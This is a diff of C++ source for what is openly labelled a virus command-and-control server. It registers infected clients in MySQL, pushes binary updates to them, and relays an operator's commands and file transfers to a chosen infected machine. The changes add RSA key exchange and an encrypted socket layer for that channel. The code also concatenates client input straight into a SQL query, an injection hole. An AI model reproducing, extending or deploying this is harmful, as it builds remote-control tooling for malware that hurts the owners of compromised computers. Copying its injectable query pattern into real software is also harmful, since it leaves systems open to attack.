@@ -8,15 +8,14 @@ MYSQL *mConnection;
 vector<Connection*> connections;
 RSA_Key pkey;
 RSA_Key pubkey;
+RSA_Key pkey_c;
+RSA_Key pubkey_c;
 
 int main()
 {
 	if((mConnection = mysql()) == NULL) {
 		return 1;
 	}
-	
-	// RSA SHIT //
-
 	RSA_KeyPair keypair;
 	unsigned long seed;
 	ifstream urandom("/dev/urandom");
@@ -25,8 +24,11 @@ int main()
 	RSA_GenerateKeyPair(&keypair, 2048, seed);
 	RSA_GetPrivateKey(&keypair, &pkey);
 	RSA_GetPublicKey(&keypair, &pubkey);
-	//memset(&keypair, 0, sizeof(keypair));
-	cout << "RSA keypair created!\n" << endl;
+	RSA_GenerateKeyPair(&keypair, 2048, seed);
+	RSA_GetPrivateKey(&keypair, &pkey_c);
+	RSA_GetPublicKey(&keypair, &pubkey_c);
+	memset((char*)&keypair, 0, sizeof(keypair));
+	cout << "RSA keypairs created!\n" << endl;
 
 	// VIRUS SOCKET //
 	int sock_server = socket(AF_INET, SOCK_STREAM, 0);
@@ -43,7 +45,6 @@ int main()
 	addr_server.sin_family = AF_INET;
 	addr_server.sin_addr.s_addr = INADDR_ANY;
 	addr_server.sin_port = htons(22222);
-
 
 	if(bind(sock_server, (struct sockaddr*)&addr_server, sizeof(sockaddr_in)) < 0)
 	{
@@ -93,7 +94,7 @@ int main()
 	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
 	{
 		c = new Connection();
-		c->sock = sock;
+		c->sockfd = sock;
 		c->addr = addr;
 		pthread_t thread;
 		pthread_create(&thread, NULL, thread_function, c);
@@ -107,39 +108,45 @@ int main()
 void *thread_function( void *ptr )
 {
 	Connection* c = (Connection*)ptr;
-	aes256_context ctx;
 
 	//Key-Exchange
-	unsigned char rsa_buf[512];
-	unsigned char rsa_tmp[256];
-	unsigned char aes_key[32];
-	RSA_PublicKeyToA(&pubkey, (char*)rsa_buf);
-	send(c->sock, rsa_buf, 256 + sizeof(pubkey.L), 0);
-	recv(c->sock, rsa_buf, 256, 0);
-	RSA_Encrypt(&pkey, (char*)rsa_buf, (char*)rsa_tmp);
-	YansPadding_Decrypt(rsa_tmp, 224, aes_key, 32);
-	aes256_init(&ctx, aes_key);
-	memset(rsa_buf, 0, 512);
+	char rsa_tmp[256];
+	char aes_key[32];
+	RSA_PublicKeyToA(&pubkey, (char*)rsa_tmp);
+	send(c->sockfd, rsa_tmp, 256 + sizeof(pubkey.L), 0);
+    int i = 0, rc;
+    while(i < 256)
+	{
+		i += (rc = recv(c->sockfd, rsa_tmp + i, 256 - i, 0));
+		if(rc == -1)
+		{
+			free(c);
+			return 0;
+		}
+	}
+	RSA_Encrypt(&pkey, (char*)rsa_tmp, (char*)rsa_tmp);
+	YansPadding_Decrypt((unsigned char*)rsa_tmp, 224, (unsigned char*)aes_key, 32);
+	secure_init(&c->sock, c->sockfd, (unsigned char*)aes_key);
 	memset(rsa_tmp, 0, 256);
 	memset(aes_key, 0, 32);
 
-	//char buf[4096];
     string sendback;
     int res;
-    //memset(buf, 0, 4096);
 	string error = "";
-	bool login;
+	bool login = false;
 
-	//while((res = recv(c->sock, &buf, 4096, 0)) > 0) {
-	char* _buf;
 	string buf;
 	int rdc;
-	while((rdc = secure_read(c->sock, &ctx, &_buf)) != -1) {
-		buf = _buf;
+	while((rdc = secure_read(&c->sock)) != -1) {
+		if(rdc == 0)
+			break;
+		else
+			buf = string(c->sock.buf, rdc);
 		if(buf[0] == '#') {
-			write(c->pipefd[1], buf.c_str(), buf.size() + 1);
-			//c->sss << buf << endl;
-			//pthread_cond_signal(&cond);
+			short size = buf.size();
+			c->buf = (char*)buf.c_str();
+			write(c->pipefd[1], &size, sizeof(size));
+			read(c->pipefd_sync[0], &size, sizeof(size));
 		} else if(buf.size() > 32) {
 			// TIME STAMP SECTION //
 			
@@ -186,11 +193,11 @@ void *thread_function( void *ptr )
 					
 					if(result == 0) {
 						sendback = string() + "#210-OK: id:" + str;
-						secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						secure_send(&c->sock, sendback.c_str(), sendback.size());
 						cout << "\tNew Client '"+ str +"' added.\n" << endl;
 					} else {
 						sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection);
-						secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						secure_send(&c->sock, sendback.c_str(), sendback.size());
 					}
 					login = true;
 				} else {
@@ -206,13 +213,13 @@ void *thread_function( void *ptr )
 						//MYSQL_ROW row = mysql_fetch_row(res);
 							//sendback = string() + "#540-ER: You seem not to have an ID.";
 							sendback = string() + "#310-ER: You seem not to have an ID.";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 							cout << "\t" << cid  << ": ID not found." << endl;;
 							error += "Client has no ID.\n";
 						} else {
 							cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
 							sendback = string() + "#220-OK: You have an valid ID! Login succeeded.";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 							c->client_id = cid;	
 
 							update_client();
@@ -225,14 +232,14 @@ void *thread_function( void *ptr )
 			
 						if(string(&buf[33]) == "") {
 							sendback = string() + "#300-ER: Empty String given.";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 						} else if(string(&buf[33]).substr(0,6) == "update") {
 							int client_version = VERSION;
 							int remote_version = atoi(string(&buf[33]).substr(7).c_str());
 							
 							if(remote_version < client_version) {
 								string sendback = string() + "#260-OK: New version available";
-								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+								secure_send(&c->sock, sendback.c_str(), sendback.size());
 
 								cout << "\tUpdate" << endl;
 							
@@ -245,7 +252,7 @@ void *thread_function( void *ptr )
 								
 								string update_size = itoa(size);
 								sendback = "#280-OK: "+ update_size;
-								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+								secure_send(&c->sock, sendback.c_str(), sendback.size());
 
 								short readcount;
 								char buf[4096];
@@ -253,38 +260,48 @@ void *thread_function( void *ptr )
 								{
 									f_update.read(buf, 4096);
 									if(size > 4096)
-										secure_send(c->sock, &ctx, buf, 4096);
+										secure_send(&c->sock, buf, 4096);
 									else
-										secure_send(c->sock, &ctx, buf, size);
+										secure_send(&c->sock, buf, size);
 									size -= 4096;
 								}	
 					
 							} else {
 								string version = itoa(remote_version);
 								string sendback = string() + "#270-OK: Latest version: " + version;	
-								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+								secure_send(&c->sock, sendback.c_str(), sendback.size());
 								cout << "\tNo Update required" << endl;
 							}
 						} else if(string(&buf[33]) == "ping") {
 							sendback = string()+ "#200-OK: pong";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							if(update_client()) {
+								cout << "\tQuery failed!" << endl;
+								// SEND MAIL/MESSAGE HERE //
+							}
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 						} else if(string(&buf[33]) == "test") {
 							sendback = string()+ "#230-OK: TEST";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 						} else if(string(&buf[33]).substr(0, 4) == "bin:") {
 							long size = atoi(string(&buf[33]).substr(4).c_str());
+							bool infinite = (size == -1);
 							short readcount;
-							while(size > 0)
+							while((size > 0) || infinite)
 							{
-								readcount = secure_read(c->sock, &ctx, &c->buf);
+								if((readcount = secure_read(&c->sock)) <= 0)
+									break;
+								c->buf = c->sock.buf;
 								write(c->pipefd[1], &readcount, 2);
 								read(c->pipefd_sync[0], &readcount, 2);
-								size -= readcount;
-								free(c->buf);
+								if(!infinite)
+									size -= readcount;
+								c->buf = 0;
 							}
+							readcount = 0;
+							write(c->pipefd[1], &readcount, 2);
 						} else {
 							sendback = string()+ "#510-ER: Command not found.";
-							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							secure_send(&c->sock, sendback.c_str(), sendback.size());
 							cout << "\t#510-ER: Command not found" << endl; 
 						}
 						if(error == "") {
@@ -298,21 +315,23 @@ void *thread_function( void *ptr )
 				
 			} else {
 				sendback = string() + "#500-ER: Wrong request sent:" + buf;
-				secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+				secure_send(&c->sock, sendback.c_str(), sendback.size());
 				cout << "#500-ER: " << cid << " sent wrong request" << endl;
 			}
 
 		}
-		if(_buf) free(_buf);
 	}
 	sendback = "#340-ER: " + cid + " lost connection\n\n";
 	cout << sendback << endl;
-	write(c->pipefd[1], sendback.c_str(), sendback.size() + 1);
-	close(c->pipefd[1]);
-	//pthread_cond_signal(&cond);
+	if(c->pipefd[1])
+	{
+		write(c->pipefd[1], sendback.c_str(), sendback.size() + 1);
+		close(c->pipefd[1]);
+	}
 
-    close(c->sock);
+    secure_close(&c->sock);
 	
+	free(c);
 }
 
 void* client_thread ( void *ptr ) {
@@ -341,9 +360,27 @@ void* client_thread ( void *ptr ) {
 }
 
 void* client_thread_function ( void *ptr ) {
-	int sock = *(int*)ptr;
+	int sockfd = *(int*)ptr;
+	struct secure_socket sock;
+
+	//Key-Exchange
+	char rsa_tmp[256];
+	char aes_key[32];
+	RSA_PublicKeyToA(&pubkey_c, (char*)rsa_tmp);
+	send(sockfd, rsa_tmp, 256 + sizeof(pubkey.L), 0);
+    int i = 0;
+    while(i < 256)
+        i += recv(sockfd, rsa_tmp + i, 256, 0);
+	RSA_Encrypt(&pkey_c, (char*)rsa_tmp, (char*)rsa_tmp);
+	YansPadding_Decrypt((unsigned char*)rsa_tmp, 224, (unsigned char*)aes_key, 32);
+	secure_init(&sock, sockfd, (unsigned char*)aes_key);
+	memset(rsa_tmp, 0, 256);
+	memset(aes_key, 0, 32);
+
 	string data;
-	while(readline(sock, data) != -1) {
+	int rdc;
+	while((rdc = secure_read(&sock)) != -1) {
+		data = string(sock.buf, rdc);
 
 		int result = mysql_query(mConnection,
 			("SELECT * FROM main.clients WHERE cid = '"+data+"'").c_str());
@@ -354,26 +391,22 @@ void* client_thread_function ( void *ptr ) {
 			for(i = connections.size()-1; i >= 0; i--) {
 				Connection* virus = connections[i];	
 				if(virus->client_id == data) {
-					//pthread_mutex_t mutex;
-					//pthread_mutex_init(&mutex, NULL);
-					//pthread_mutex_lock(&mutex);
-
 					pipe(virus->pipefd);
 					pipe(virus->pipefd_sync);
 					
-					string sendback = "#240-OK: Client exists, connected.";
-					send(sock, sendback.c_str(), sendback.size()+1, 0);
+					string sendback = "#240-OK: Client exists";
+					secure_send(&sock, sendback.c_str(), sendback.size());
 
 					//sendback = "#250-OK: Init control mode\n";
 					//send(virus->sock, sendback.c_str(), sendback.size(), 0); 
 
-
 					string client_data;
 					int res = 1;
 					int i = 0;
-					while( readline(sock, client_data) != -1 && res == 1) {
+					while((rdc = secure_read(&sock)) != -1) {
+						client_data = string(sock.buf, rdc);
 						client_data = "#500-CO: " + client_data;
-						send(virus->sock, client_data.c_str(), client_data.size()+1, 0);
+						secure_send(&virus->sock, client_data.c_str(), client_data.size());
 						if(client_data.substr(9,7) == "upload ")
 						{
 							long size = atoi(client_data.substr(client_data.find(':',9)+1).c_str());
@@ -381,35 +414,41 @@ void* client_thread_function ( void *ptr ) {
 							char buf[4096];
 							while(size > 0)
 							{
-								if(size > 4096)
-									readcount = recv(sock, buf, 4096, 0);
-								else
-									readcount = recv(sock, buf, size, 0);
-								send(virus->sock, buf, readcount, 0);
-								size -= readcount;
+								//TODO
+								break;
 							}
 						}
 
 						string virus_data;
-						char buf;
-						while((res = read(virus->pipefd[0], &buf, 1)) && buf != 0)
-							virus_data += buf;
-						if(res != 1) break;
-						//while( !getline(virus->sss, virus_data) ) {
-							//cout << "begin " << virus_data << endl;
-							//pthread_cond_wait(&cond, &mutex);
-							//cout << "end" << endl;
-						//}					
-						send(sock, virus_data.c_str(), virus_data.size()+1, 0);
-						if(virus_data.substr(0, 4) == "#600")
+						short size;
+						if(res = read(virus->pipefd[0], &size, sizeof(size)) == -1)
+							break;
+						virus_data = string(virus->buf, size);
+						write(virus->pipefd_sync[1], &size, sizeof(size));
+						secure_send(&sock, virus_data.c_str(), virus_data.size());
+						if(virus_data.substr(0, 4) == "#500")
+						{
+							short readcount;
+							while(true)
+							{
+								read(virus->pipefd[0], &readcount, 2);
+								if(readcount <= 0)
+									break;
+								secure_send(&sock, virus->buf, readcount);
+								write(virus->pipefd_sync[1], &readcount, 2);
+							}
+							secure_send(&sock, 0, 0);
+						}
+						else if(virus_data.substr(0, 4) == "#600")
 						{
 							long size = atoi(virus_data.substr(virus_data.find(':', 9) + 1).c_str());
-							char buf[4096];
 							short readcount;
 							while(size > 0)
 							{
 								read(virus->pipefd[0], &readcount, 2);
-								send(sock, virus->buf, readcount, 0);
+								if(readcount <= 0)
+									break;
+								secure_send(&sock, virus->buf, readcount);
 								write(virus->pipefd_sync[1], &readcount, 2);
 								size -= readcount;
 							}							
@@ -418,33 +457,31 @@ void* client_thread_function ( void *ptr ) {
 					if(res != 1)
 					{	
 						client_data = "#340-ER: Virus lost connection\n";
-						send(sock, client_data.c_str(), client_data.size()+1, 0);
+						secure_send(&sock, client_data.c_str(), client_data.size());
 					}
-					//pthread_mutex_unlock(&mutex);
-					//pthread_mutex_destroy(&mutex);
 					close(virus->pipefd[0]);
+					break;
 				}
 			}
 			
 			if(i == -1) {
 				string client_data = "#520-ER: Virus not active";
-				send(sock, client_data.c_str(), client_data.size()+1, 0);
-				
+				secure_send(&sock, client_data.c_str(), client_data.size());
 			}
 
 		} else {
 			string sendback = "#580-ER: This Client was not found in the database.";	
-			send(sock, sendback.c_str(), sendback.size()+1, 0);
+			secure_send(&sock, sendback.c_str(), sendback.size());
 		}
-		if(send(sock, data.c_str(), data.size(), 0) == -1) break;
-		//cout << data << endl;
+		if(secure_send(&sock, data.c_str(), data.size()) == -1) break;
+		cout << data << endl;
 	}
 	
 }
 
 // PAUSE //
 
-int readline ( int socket, string& str )
+/*int readline ( int socket, string& str )
 {
     int res;
 	char buf;
@@ -454,7 +491,7 @@ int readline ( int socket, string& str )
 		if(res != 1)
 			return -1;
 	return str.size();
-}
+}*/
 
 // PAUSE // 
 
@@ -476,56 +513,4 @@ string itoa(long i)
     stringstream ss;
     ss << i;
     return ss.str();
-}
-
-int secure_send(int sock, aes256_context* ctx, const char* data, int size) {
-    unsigned char buf[32];
-    memset(buf, 0, 32);
-    memcpy(buf, (char*)&size, sizeof(size));
-    aes256_encrypt_ecb(ctx, buf);
-    send(sock, (char*)buf, 32, 0);
-
-    for(int i = 0; i < size; i += 32) {
-        if(size - i >= 32)
-            memcpy(buf, &data[i], 32);
-        else {
-            memset(buf, 0, 32);
-            memcpy(buf, &data[i], size - i);
-        }
-        aes256_encrypt_ecb(ctx, buf);
-        if(send(sock, (char*)buf, 32, 0) != 32)
-            return -1;
-    }
-	return size;
-}
-
-int secure_read(int sock, aes256_context* ctx, char** data) {
-    int size;
-    unsigned char buf[32];
-    if(recv(sock, (char*)buf, 32, 0) != 32)
-		return -1;
-    aes256_decrypt_ecb(ctx, buf);
-	for(int i = 0; i < 32; i++)
-		cout <<	hex << (int)buf[i] << dec << ' ';
-	cout << endl;
-    size = *(int*)&buf[0];
-	cout << size << endl;
-	if(size < 0)
-		return -1;
-    *data = (char*)malloc(size);
-
-    for(int i = 0; i < size; i += 32) {
-        if(recv(sock, (char*)buf, 32, 0) != 32)
-		{
-			free(*data);
-			*data = 0;
-            return -1;
-		}
-        aes256_decrypt_ecb(ctx, buf);
-        if(size - i >= 32)
-            memcpy(&(*data)[i], buf, 32);
-        else
-            memcpy(&(*data)[i], buf, size - i);
-    }
-    return size;
 }
